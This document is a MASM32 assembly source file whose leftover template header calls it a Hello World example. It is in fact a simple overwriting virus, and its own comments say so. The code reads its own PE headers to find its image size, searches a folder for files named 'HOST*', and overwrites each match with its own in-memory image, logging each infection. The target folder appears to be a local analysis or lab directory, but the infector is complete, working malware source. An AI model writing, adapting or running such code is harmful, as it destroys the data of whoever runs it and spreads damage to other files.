; *************************************************************************
; 32-bit Windows Console Hello World Application - MASM32 Example
; EXE File size: 2,560 Bytes
; Created by Visual MASM (http://www.visualmasm.com)
; *************************************************************************
                                    
.386					; Enable 80386+ instruction set
.model flat, stdcall	; Flat, 32-bit memory model (not used in 64-bit)
option casemap: none	; Case insensitive syntax

; *************************************************************************
; MASM32 proto types for Win32 functions and structures
; *************************************************************************  
include c:\masm32\include\kernel32.inc
include c:\masm32\include\windows.inc
include c:\masm32\include\masm32.inc
include c:\masm32\include\msvcrt.inc

printf PROTO C, :VARARG
sprintf PROTO C, :VARARG
                                  
; *************************************************************************
; MASM32 object libraries
; *************************************************************************  
includelib c:\masm32\lib\kernel32.lib
includelib c:\masm32\lib\masm32.lib  
includelib c:\masm32\lib\msvcrt.lib  

; *************************************************************************
; Our data section. Here we declare our strings for our message
; *************************************************************************
.data
	lpcstrFileName  db "C:\Users\user\Desktop\Analysis\Morgue\Infect\HOST*",0
	lpcstrFileFullPath  db "C:\Users\user\Desktop\Analysis\Morgue\Infect\%s",0
	lpcstrFileFullPathBuffer db 100 dup(0)
	lpcstrPrint		db "File handle: %x", 10, 0
	lpcstrName		db "Infecting file: %s", 10, 0
	lpcstre_magic	db "e_magic: %s", 10, 0
	lpcstrpe_magic	db "NT_HEADERS Magic: %s", 10, 0
	lpcstrMachine	db "FILE HEADER Machine: %x", 10, 0
	lpcstrOPMagic	db "OPTIONAL HEADER Magic: %x", 10, 0
	lpcstrInfection db "File %s is overwritten!", 10, 0
	lpcstrError		db "GetLastError code: %d", 10, 0
	hSearchHandle	dd 0        
	hFileHandle     dd 0
	dwImageBase		dd 0
	dwImageSize		dd 0
 	gFindData 	WIN32_FIND_DATA <>

; *************************************************************************
; Our executable assembly code starts here in the .code section
; *************************************************************************
.code

start:
	; Use the StdOut API function to display the text in a console.
	                                    
LOAD:
	;Get the base address of the current running process(or the virus)                
	invoke GetModuleHandleA, 0
	;Save ImageBase inside dwImageBase
	mov [dwImageBase], eax 
	invoke printf, addr lpcstre_magic, eax
	
	mov eax, [dwImageBase]
	mov ebx, [dwImageBase] 
	add ebx, 3ch ;Add e_lfanew RVA
	add eax, [ebx] ;Advance to Signature in NT_HEADERS
	xchg eax, ebx
	invoke printf, addr lpcstrpe_magic, ebx
	
	mov eax, ebx ;Pass NT_HEADERS 
	add eax, 4  ;Advanced to FILE_HEADER
	mov eax, [eax] ;Get Machine value
	xor ecx, ecx
	mov cx, ax
	invoke printf, addr lpcstrMachine, ecx
	
	add ebx, 18h ;Advance to OPTIONAL_HEADER
	mov eax, [ebx] ;Get Magic value
	xor ecx, ecx
	mov cx, ax
	invoke printf, addr lpcstrOPMagic, ecx
	
	add ebx, 38h ;Advance to SizeOfImage
	mov ebx, [ebx] ;Get SizeOfImage value
	mov [dwImageSize], ebx ;Store ImageSize
	
	
FIRST:
	invoke FindFirstFileA, addr lpcstrFileName, addr gFindData ;Get the first file
	test eax, eax
	jz ERR
	mov [hSearchHandle], eax ;Save the files search handle
	invoke printf, addr lpcstrPrint, eax
	jmp FIND
	
NEXT:
	invoke FindNextFileA, [hSearchHandle], addr gFindData  ;Find the next file
	test eax, eax
	jz ERR
	jmp FIND
                                    
FIND:
	invoke printf, addr lpcstrName, addr gFindData.cFileName ;Print found file name
	invoke sprintf, addr lpcstrFileFullPathBuffer, addr lpcstrFileFullPath, addr gFindData.cFileName
	invoke CreateFileA, addr lpcstrFileFullPathBuffer, ;Open a handle to the file
								FILE_ALL_ACCESS, 
								0, 
								0, 
								OPEN_EXISTING,
								FILE_ATTRIBUTE_NORMAL,
								NULL
	cmp eax, INVALID_HANDLE_VALUE
	jz ERR
	mov [hFileHandle], eax
	
WRITE:
	;Start of the beggining of the file
	invoke SetFilePointer, [hFileHandle], 0, 0, 0
	cmp eax, INVALID_SET_FILE_POINTER
	jz ERR
	;Overwrite found file with our file
	invoke WriteFile, [hFileHandle], [dwImageBase], [dwImageSize], NULL, NULL 
	test eax, eax
	JZ ERR
	invoke printf, addr lpcstrInfection, addr gFindData.cFileName
	invoke CloseHandle, [hFileHandle]
	jmp NEXT

ERR:
	invoke GetLastError
	invoke printf, addr lpcstrError, eax   

EXIT:
	; When the console has been closed, exit the app with exit code 0
    invoke ExitProcess, 0
end start
